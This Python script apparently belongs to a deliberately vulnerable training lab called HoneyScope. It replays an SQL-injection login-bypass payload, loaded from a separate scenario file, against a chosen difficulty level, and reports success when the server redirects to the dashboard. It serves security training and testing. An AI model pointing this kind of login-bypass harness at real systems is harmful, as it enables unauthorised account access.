#!/usr/bin/env python3
"""Replay the sqli-login payload for a level against a running HoneyScope.

Usage: python attack.py http://localhost:5000 [low|medium|high|impossible]
Exit code 0 = login bypassed, 1 = not bypassed. Standard library only.
Only run against instances you own.
"""
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def attack(base_url: str, level: str) -> bool:
    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, "scenario.json")) as f:
        payload = json.load(f)["payloads"][level]
    data = urllib.parse.urlencode(payload).encode()
    opener = urllib.request.build_opener(_NoRedirect)
    try:
        opener.open(urllib.request.Request(base_url.rstrip("/") + "/login", data=data))
    except urllib.error.HTTPError as e:
        return e.code == 302 and e.headers.get("Location", "").endswith("/dashboard")
    return False


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    lvl = sys.argv[2] if len(sys.argv) > 2 else "low"
    ok = attack(url, lvl)
    print(f"[{lvl}] login bypass {'SUCCEEDED' if ok else 'failed'}")
    sys.exit(0 if ok else 1)
